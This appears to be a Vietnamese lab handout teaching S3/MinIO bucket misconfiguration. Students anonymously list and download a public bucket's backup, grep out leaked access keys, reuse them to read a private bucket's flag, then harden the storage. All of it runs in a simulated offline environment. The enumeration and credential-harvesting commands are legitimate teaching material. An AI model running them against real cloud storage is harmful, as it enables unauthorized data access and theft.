# Cấu hình sai lưu trữ đối tượng trên Cloud (S3 Misconfiguration)

**Mức độ:** Trung bình  |  **Phân loại:** Cloud Security / DevSecOps / Object Storage

**Ánh xạ khung tham chiếu:** MITRE ATT&CK for Cloud — T1530 (Data from Cloud Storage Object), T1580 (Cloud Infrastructure Discovery), T1552.001 (Unsecured Credentials: Credentials In Files) · OWASP Cloud-Native / Top 10 (Security Misconfiguration, Broken Access Control) · CIS Controls (Data Protection, Secure Configuration)

---

## 1. Giới thiệu lab

| Thông tin | Chi tiết |
|-----------|----------|
| **Tên Lab** | `devops-s3-misconfig` |
| **Mức độ** | Trung bình |
| **Công cụ sử dụng** | **Firefox** (xem trực quan XML liệt kê bucket ẩn danh), `aws-cli` (s3 / s3api với `--endpoint-url`), `mc` (MinIO Client), `curl`, `jq` |
| **Kiến thức yêu cầu** | Kiến thức cơ bản về dòng lệnh Linux; hiểu sơ lược mô hình lưu trữ đối tượng (object storage), khái niệm bucket/object; biết đọc JSON. Các khái niệm về S3 policy, IAM, anonymous access sẽ được nhắc lại trong mục Kiến thức bổ trợ, không yêu cầu kinh nghiệm AWS thực tế. |

**Mục tiêu học tập**
- Hiểu mô hình lưu trữ đối tượng tương thích S3 và cách các dịch vụ cloud (AWS S3, MinIO) kiểm soát truy cập qua bucket policy và IAM.
- Nhận diện các dạng cấu hình sai phổ biến khiến bucket cho phép truy cập ẩn danh (anonymous list/get) và hậu quả lộ lọt dữ liệu.
- Thực hành kỹ thuật tấn công T1530 — liệt kê (enumerate) và trích xuất (exfiltrate) dữ liệu từ object storage bị cấu hình sai.
- Hiểu chuỗi tấn công leo thang: từ dữ liệu lộ lọt → credential → truy cập bucket khác được bảo vệ.
- Áp dụng tư duy DevSecOps để khắc phục: thiết lập policy private, least privilege, chặn public access, bật versioning.

**Kỹ năng đạt được**
- Kỹ năng dùng `aws-cli` và `mc` trỏ tới endpoint S3 tùy biến để thao tác với object storage.
- Kỹ năng phát hiện và khai thác bucket policy cấu hình sai cho phép anonymous access.
- Kỹ năng săn tìm credential lộ lọt trong file backup/cấu hình và dùng chúng để mở rộng phạm vi truy cập.
- Kỹ năng đọc, phân tích và viết lại bucket policy (JSON) theo nguyên tắc least privilege.
- Kỹ năng hardening object storage: tắt public access, bật versioning, xác minh cấu hình an toàn.

---

## 2. Kịch bản

**Tình huống:**
Trong quá trình đánh giá an ninh hạ tầng cloud nội bộ của một doanh nghiệp, sinh viên đóng vai một **pentester/attacker** đã có quyền truy cập mạng tới endpoint dịch vụ lưu trữ đối tượng của "cloud" nội bộ (một dịch vụ tương thích S3 chạy trên `172.33.0.30:9000`). Đây là môi trường **mô phỏng cloud offline**: dịch vụ object storage được đóng vai bởi **MinIO** (tương thích API S3) — không có AWS thật. Bộ phận DevOps đã cấu hình vội một bucket dùng để chia sẻ tài nguyên tĩnh nhưng vô tình đặt policy cho phép **anonymous list & get**. Attacker cần lợi dụng cấu hình sai này để liệt kê dữ liệu, tải về file backup nhạy cảm, từ đó phát hiện credential dẫn tới một bucket khác chứa dữ liệu mật (flag). Cuối cùng, với vai trò **DevOps engineer**, sinh viên phải khắc phục cấu hình sai đó.

**Vai trò của sinh viên:**
- Đóng vai attacker trên máy `client`, phát hiện và liệt kê các bucket/đối tượng có thể truy cập ẩn danh trên endpoint MinIO.
- Trích xuất (tải về) dữ liệu nhạy cảm từ bucket public, phân tích để tìm credential bị lộ lọt.
- Dùng credential tìm được để truy cập bucket được bảo vệ và lấy flag.
- Chuyển vai DevOps engineer: sửa bucket policy về private, chặn anonymous access, áp dụng least privilege và bật versioning.

**Sơ đồ mạng**

```
+-------------------------------+                    +---------------------------------------+
|            client             |                     |               storage                 |
|  (máy tấn công / attacker /   |    mạng ảo          |   (S3 giả - Object Storage "cloud")   |
|   DevOps engineer)            |    Labtainer        |                                        |
|                                | ==================>  |   MinIO server API :9000              |
|  aws-cli / mc / curl / jq     |    172.33.0.0/24     |                                        |
|  IP: 172.33.0.10              |                      |   IP: 172.33.0.30                     |
+-------------------------------+                      |                                        |
                                                        |  Bucket public-assets                 |
   Luồng: enumerate anon -> tải backup                 |    (MISCONFIG: anonymous list/get)    |
          -> lấy credential -> truy cập bucket         |  Bucket secure-data                   |
          bảo vệ -> flag -> hardening                  |    (private, chứa object flag)        |
                                                        +---------------------------------------+
```

---

## 3. Kiến thức bổ trợ

**Kiến thức nền tảng**

- **Object storage & S3:** Lưu trữ đối tượng tổ chức dữ liệu thành các *object* (file + metadata) đặt trong *bucket* (không gian tên phẳng, không phải thư mục cây thật sự). Amazon S3 là dịch vụ tiêu biểu; API của nó trở thành chuẩn de-facto, được nhiều sản phẩm (như **MinIO**) hỗ trợ tương thích. Mỗi object được định danh bằng `s3://<bucket>/<key>`.

- **MinIO:** Phần mềm object storage mã nguồn mở, tương thích API S3, thường dùng để tự dựng "cloud storage" on-premise. Trong lab này MinIO đóng vai dịch vụ S3 của cloud. Vì tương thích S3 nên có thể thao tác bằng cả `aws-cli` (trỏ `--endpoint-url`) lẫn `mc` (MinIO Client).

- **Bucket policy & IAM:** Quyền truy cập object storage được kiểm soát bởi *bucket policy* (chính sách JSON gắn vào bucket, quy định ai được làm gì) và *IAM* (danh tính & quyền của người dùng/ứng dụng). Một policy có `"Principal": "*"` với action `s3:ListBucket`/`s3:GetObject` nghĩa là **bất kỳ ai (kể cả ẩn danh) đều đọc được** — đây là cấu hình sai phổ biến nhất.

- **Anonymous access & T1530:** Khi bucket cho phép truy cập ẩn danh, attacker không cần credential vẫn liệt kê và tải toàn bộ object. MITRE ATT&CK gọi hành vi lấy dữ liệu từ object storage là **T1530 – Data from Cloud Storage Object**. Rủi ro tăng cao khi bucket chứa backup, file cấu hình, hoặc credential (T1552.001).

- **Least privilege:** Nguyên tắc DevSecOps: chỉ cấp quyền tối thiểu cần thiết. Với S3/MinIO, hardening gồm: gỡ policy public, đặt bucket về private, và bật *versioning* (chống mất/ghi đè dữ liệu, hỗ trợ phục hồi).

**Thành phần cần quan sát trong bài lab**

| Thành phần | Vai trò |
|------------|---------|
| Endpoint MinIO `172.33.0.30:9000` | Điểm truy cập API S3 của "cloud"; nơi mọi lệnh `aws s3`/`mc` trỏ tới. |
| Bucket `public-assets` | Bucket bị **cấu hình sai**: policy cho phép anonymous `ListBucket` + `GetObject`. Điểm khởi đầu của chuỗi tấn công. |
| File backup trong `public-assets` (`backup/app-backup-20250811.tar.gz`, chứa `app-config.env`) | Chứa **credential lộ lọt** (access key/secret key) dẫn tới bucket khác. |
| Bucket `secure-data` | Bucket **private**, chỉ truy cập được bằng credential tìm thấy; chứa object đựng **flag**. |
| Bucket policy (JSON) | Đối tượng cần đọc/phân tích để hiểu misconfig và cần được viết lại khi hardening. |
| `~/hardening-admin.env` (trên `client`) | Credential DevOps được **cấp sẵn** cho Nhiệm vụ 4, khác với credential bị lộ ở Nhiệm vụ 2. |

**Bảng tùy chọn và cú pháp công cụ sử dụng trong bài**

| Công cụ | Tùy chọn / Cú pháp | Mô tả tác dụng |
|---------|--------------------|----------------|
| aws-cli | `aws --endpoint-url http://<IP>:9000 s3 ls s3://<bucket> --no-sign-request` | Liệt kê object trong bucket **không ký request** (truy cập ẩn danh). |
| aws-cli | `aws --endpoint-url http://<IP>:9000 s3 cp s3://<bucket>/<key> <local> --no-sign-request` | Tải object về máy attacker (ẩn danh). |
| aws-cli | `aws --endpoint-url http://<IP>:9000 s3api get-bucket-policy --bucket <bucket> --no-sign-request` | Đọc bucket policy đang áp dụng (JSON). |
| aws-cli | biến môi trường `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` | Cấu hình credential để gọi API có xác thực. |
| aws-cli | `aws --endpoint-url http://<IP>:9000 s3api delete-bucket-policy --bucket <bucket>` | Xóa bucket policy public (đưa bucket về private). |
| aws-cli | `aws --endpoint-url http://<IP>:9000 s3api put-bucket-versioning --bucket <bucket> --versioning-configuration Status=Enabled` | Bật versioning cho bucket. |
| aws-cli | `aws --endpoint-url http://<IP>:9000 s3api get-bucket-versioning --bucket <bucket>` | Kiểm tra trạng thái versioning hiện tại. |
| mc | `mc alias set <name> http://<IP>:9000 <access_key> <secret_key>` | Tạo alias kết nối tới MinIO với credential. |
| mc | `mc ls <alias>/<bucket>` · `mc cp <alias>/<bucket>/<key> <local>` | Liệt kê / tải object bằng MinIO Client. |
| curl | `curl -s http://<IP>:9000/<bucket>/?list-type=2` | Gọi trực tiếp API S3 (ListObjectsV2) qua HTTP để kiểm tra anonymous list. |
| jq | `... \| jq .` / `jq -r '.Statement[]'` | Định dạng và trích lọc JSON (bucket policy, output API). |

---

## 4. Các nhiệm vụ của bài thực hành

Để tải bài thực hành, sinh viên thực hiện câu lệnh:

```bash
imodule https://github.com/namlt04/do-an-2026/raw/refs/heads/master/imodule/devops-s3-misconfig.tar
```

Để khởi động bài thực hành, sinh viên dùng câu lệnh:

```bash
labtainer devops-s3-misconfig
```

*(Chú ý: sinh viên sử dụng mã sinh viên của mình để nhập thông tin email người thực hiện bài lab khi có yêu cầu, để sử dụng khi chấm điểm — mỗi sinh viên sẽ có một flag và một credential khác nhau, không thể copy đáp án của nhau.)*

Sau khi khởi động xong, một terminal ảo sẽ xuất hiện, đại diện cho máy tấn công: `client`. Toàn bộ lệnh dưới đây gõ trên `client`. Endpoint object storage của "cloud" là `http://172.33.0.30:9000`.

> **Ghi chú credential giả:** Mọi access key/secret key trong bài là **giả, do lab sinh ra**, chỉ có tác dụng trong môi trường MinIO cục bộ này, không phải credential AWS thật.

> **Ghi chú:** Mỗi nhiệm vụ yêu cầu lưu đúng kết quả vào các file trong thư mục `$HOME` như hướng dẫn ở từng bước. Các file này phải phản ánh kết quả thật của chuỗi khai thác/hardening — nếu không thực hiện đúng, nội dung sẽ không khớp và nhiệm vụ không đạt.

---

### Nhiệm vụ 1 — enum_anonymous: Phát hiện & liệt kê bucket truy cập ẩn danh

**Mục tiêu:** Xác nhận endpoint object storage phản hồi, phát hiện bucket cho phép truy cập ẩn danh và liệt kê được nội dung của nó mà không cần credential.

**Bước 1 (GUI):** Máy `client` đã cài sẵn **Firefox**. Mở trình duyệt và truy cập trực tiếp API liệt kê object của bucket nghi ngờ:
```
http://172.33.0.30:9000/public-assets/?list-type=2
```
Nếu bucket bị cấu hình public, trình duyệt sẽ hiển thị một tài liệu **XML (ListBucketResult)** liệt kê toàn bộ key trong bucket (ví dụ thấy `backup/app-backup-20250811.tar.gz`) — đây chính là bằng chứng trực quan của anonymous list. Nếu bucket private, trình duyệt hiện XML báo `AccessDenied`.

> Thao tác nhanh ở dòng lệnh tương đương (tuỳ chọn): `curl -s http://172.33.0.30:9000/public-assets/?list-type=2 | head -40`.

Các bước ký request (tải object, đọc/sửa policy, versioning) ở dưới **vẫn dùng dòng lệnh** `aws-cli`/`mc`, vì cần ký SigV4 — không thực hiện được bằng trình duyệt.

**Bước 2:** Dùng `aws-cli` liệt kê object trong bucket nghi ngờ bằng chế độ không ký request, đồng thời lưu kết quả ra file:
```bash
aws --endpoint-url http://172.33.0.30:9000 s3 ls s3://public-assets --recursive --no-sign-request \
  | tee /tmp/list.out
( grep -q 'backup/app-backup' /tmp/list.out && echo -n LISTED || echo -n NOLIST ) > ~/recon_list_status.txt
```

**Bước 3:** Xác nhận quyền đọc ẩn danh (bằng chứng bucket bị public), đồng thời lưu kết quả:
```bash
# Tai mot object tinh ma KHONG dung credential -> chung minh GetObject an danh
aws --endpoint-url http://172.33.0.30:9000 s3 cp s3://public-assets/static/notice.txt - --no-sign-request
( aws --endpoint-url http://172.33.0.30:9000 s3 ls s3://public-assets --no-sign-request >/dev/null 2>&1 \
  && echo -n PUBLICREAD || echo -n NOPUBLIC ) > ~/recon_policy_status.txt
```
> **Lưu ý:** dịch vụ tương thích S3 (MinIO, và cả AWS thật) **không cho đọc bucket policy khi ẩn danh** — `s3api get-bucket-policy --no-sign-request` sẽ báo `AccessDenied`. Việc **liệt kê và tải object ẩn danh thành công** đã là bằng chứng bucket bị cấu hình public. Nội dung policy chi tiết (`"Principal": "*"`, action `s3:GetObject`/`s3:ListBucket`) sẽ được đọc ở **Nhiệm vụ 4** khi em đã có credential quản trị.

**Điều kiện hoàn thành nhiệm vụ:** Liệt kê VÀ tải object ẩn danh (không dùng credential) thành công trên bucket `public-assets` — `~/recon_list_status.txt` chứa `LISTED` và `~/recon_policy_status.txt` chứa `PUBLICREAD` — chứng tỏ bucket cho phép truy cập ẩn danh (misconfiguration). (Nội dung policy chi tiết sẽ đọc ở Nhiệm vụ 4.)

**Câu hỏi 1:** Trong bucket policy (em sẽ đọc được bằng credential quản trị ở Nhiệm vụ 4), thành phần cụ thể nào biến bucket này thành "public"? Nếu chỉ muốn cho phép đọc file tĩnh công khai (ví dụ ảnh) nhưng KHÔNG cho liệt kê toàn bộ nội dung bucket, cần thay đổi gì trong policy?
Trả lời: _______________________________________

---

### Nhiệm vụ 2 — exfiltrate_backup: Trích xuất backup và tìm credential lộ lọt

**Mục tiêu:** Tải về dữ liệu nhạy cảm từ bucket public và phân tích để phát hiện credential (access key/secret key) bị lộ trong file backup/cấu hình.

**Bước 1:** Tải file backup từ bucket public về máy attacker:
```bash
mkdir -p ~/loot
aws --endpoint-url http://172.33.0.30:9000 s3 cp \
  s3://public-assets/backup/app-backup-20250811.tar.gz ~/loot/ --no-sign-request
```

**Bước 2:** Giải nén backup để xem nội dung:
```bash
tar -xzvf ~/loot/app-backup-20250811.tar.gz -C ~/loot/
cat ~/loot/app-config.env
```

**Bước 3:** Săn tìm credential lộ lọt trong file cấu hình:
```bash
grep -rniE 'access_?key|secret_?key' ~/loot/
```

**Bước 4:** Trích đúng access key và secret key ra 2 file riêng (KHÔNG kèm nhãn, KHÔNG có khoảng trắng/thừa dòng):
```bash
grep '^AWS_ACCESS_KEY_ID='     ~/loot/app-config.env | cut -d= -f2 | tr -d '\r\n ' > ~/creds_access_key.txt
grep '^AWS_SECRET_ACCESS_KEY=' ~/loot/app-config.env | cut -d= -f2 | tr -d '\r\n ' > ~/creds_secret_key.txt
cat ~/creds_access_key.txt; echo; cat ~/creds_secret_key.txt; echo
```

**Điều kiện hoàn thành nhiệm vụ:** Tải và giải nén thành công file backup từ `public-assets`, trích xuất được đúng cặp `access_key`/`secret_key` từ `app-config.env` và lưu đúng vào `~/creds_access_key.txt` / `~/creds_secret_key.txt`.

**Câu hỏi 2:** Vì sao việc lưu file backup/cấu hình chứa credential trong một bucket cho phép anonymous read lại nguy hiểm hơn nhiều so với việc chỉ lộ vài file tĩnh vô hại? Hãy nêu nguyên tắc bảo mật nào đã bị vi phạm ở đây.
Trả lời: _______________________________________

---

### Nhiệm vụ 3 — access_secure_bucket: Dùng credential lộ để lấy flag

**Mục tiêu:** Dùng credential vừa tìm được để xác thực vào object storage và truy cập bucket private `secure-data`, lấy flag.

**Bước 1:** Cấu hình credential tìm được bằng biến môi trường:
```bash
export AWS_ACCESS_KEY_ID=$(cat ~/creds_access_key.txt)
export AWS_SECRET_ACCESS_KEY=$(cat ~/creds_secret_key.txt)
export AWS_DEFAULT_REGION=us-east-1
```

**Bước 2:** Liệt kê các bucket mà credential này nhìn thấy (lần này KHÔNG dùng `--no-sign-request`):
```bash
aws --endpoint-url http://172.33.0.30:9000 s3 ls
```

**Bước 3:** Liệt kê nội dung bucket private và tải object chứa flag về đúng file `~/loot.txt`:
```bash
aws --endpoint-url http://172.33.0.30:9000 s3 ls s3://secure-data --recursive
aws --endpoint-url http://172.33.0.30:9000 s3 cp s3://secure-data/confidential/flag.txt ~/loot.txt
cat ~/loot.txt
```
*(Cách khác dùng `mc`: `mc alias set loot http://172.33.0.30:9000 <access_key> <secret_key>` rồi `mc ls loot/secure-data` và `mc cp loot/secure-data/confidential/flag.txt ~/loot.txt`.)*

**Điều kiện hoàn thành nhiệm vụ:** Xác thực thành công bằng credential lộ lọt, truy cập bucket `secure-data` và lưu đúng nội dung object flag vào `~/loot.txt`.

**Câu hỏi 3:** Trình bày lại toàn bộ chuỗi khai thác từ khi phát hiện endpoint đến khi lấy được flag. Đâu là "nguyên nhân gốc rễ" (root cause) khiến chuỗi tấn công này khả thi, và một credential bị lộ có thể gây thiệt hại lan rộng như thế nào (khái niệm blast radius)?
Trả lời: _______________________________________

---

### Nhiệm vụ 4 — harden_storage: Khắc phục cấu hình sai (DevSecOps)

**Mục tiêu:** Chuyển vai DevOps engineer, loại bỏ cấu hình sai: đưa bucket public về private, chặn anonymous access, và bật cơ chế bảo vệ dữ liệu. Sử dụng credential hardening đã được **cấp sẵn** trong file `~/hardening-admin.env` (KHÔNG dùng credential bị lộ ở Nhiệm vụ 2 — credential đó chỉ có quyền đọc `secure-data`, không đủ quyền sửa policy).

**Bước 1:** Nạp credential hardening được cấp sẵn:
```bash
cat ~/hardening-admin.env
export AWS_ACCESS_KEY_ID=$(grep '^AWS_ACCESS_KEY_ID=' ~/hardening-admin.env | cut -d= -f2)
export AWS_SECRET_ACCESS_KEY=$(grep '^AWS_SECRET_ACCESS_KEY=' ~/hardening-admin.env | cut -d= -f2)
```

**Bước 2:** Đọc policy public đang áp dụng (giờ đã có quyền `s3:GetBucketPolicy`), rồi gỡ bỏ nó để chặn anonymous access:
```bash
# Doc policy hien tai -> quan sat "Principal":"*" + s3:GetObject/s3:ListBucket (chinh la nguyen nhan public)
aws --endpoint-url http://172.33.0.30:9000 s3api get-bucket-policy --bucket public-assets | jq -r '.Policy' | jq .
# Go bo policy public (dua bucket ve private)
aws --endpoint-url http://172.33.0.30:9000 s3api delete-bucket-policy --bucket public-assets
```

**Bước 3:** Bật versioning cho bucket `secure-data` để chống mất/ghi đè và hỗ trợ phục hồi:
```bash
aws --endpoint-url http://172.33.0.30:9000 s3api put-bucket-versioning \
  --bucket secure-data --versioning-configuration Status=Enabled
```

**Bước 4:** Xác minh trạng thái cuối và lưu kết quả. Chạy CHÍNH XÁC 2 khối lệnh sau (mỗi khối tạo 1 file, dựa trên phản hồi THẬT từ MinIO):
```bash
# 4a. anonymous list PHẢI thất bại (AccessDenied) sau khi đã gỡ policy
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY
aws --endpoint-url http://172.33.0.30:9000 s3 ls s3://public-assets --no-sign-request \
  > /tmp/anon.out 2>&1
( grep -qi AccessDenied /tmp/anon.out && echo -n DENIED || echo -n ALLOWED ) > ~/harden_anon_status.txt
cat /tmp/anon.out

# 4b. versioning của secure-data PHẢI ở trạng thái Enabled (dùng lại credential hardening)
export AWS_ACCESS_KEY_ID=$(grep '^AWS_ACCESS_KEY_ID=' ~/hardening-admin.env | cut -d= -f2)
export AWS_SECRET_ACCESS_KEY=$(grep '^AWS_SECRET_ACCESS_KEY=' ~/hardening-admin.env | cut -d= -f2)
aws --endpoint-url http://172.33.0.30:9000 s3api get-bucket-versioning --bucket secure-data \
  > /tmp/ver.out 2>&1
( grep -q '"Status": "Enabled"' /tmp/ver.out && echo -n ENABLED || echo -n DISABLED ) > ~/harden_versioning_status.txt
cat /tmp/ver.out
```

**Bước 5 (khuyến nghị, không bắt buộc để đạt goal):** Ghi chú lại việc cần **xoay vòng (rotate)** credential đã bị lộ ở Nhiệm vụ 2 (đổi sang cặp key mới, vô hiệu hóa key cũ) và **di dời** file backup nhạy cảm ra khỏi bucket public.

**Điều kiện hoàn thành nhiệm vụ:** Sau khi hardening, lệnh liệt kê ẩn danh trả về AccessDenied thật sự (file `~/harden_anon_status.txt` chứa `DENIED`); bucket `secure-data` có versioning ở trạng thái `Enabled` (file `~/harden_versioning_status.txt` chứa `ENABLED`).

**Câu hỏi 4:** Ngoài việc gỡ policy public, vì sao bước "xoay vòng (rotate) credential đã bị lộ" là bắt buộc chứ không phải tùy chọn? Hãy liệt kê ít nhất ba biện pháp phòng ngừa (preventive/detective control) giúp phát hiện sớm hoặc ngăn tái diễn dạng cấu hình sai này trong quy trình DevSecOps (gợi ý: CI policy scan, block public access mặc định, access logging/alerting).
Trả lời: _______________________________________
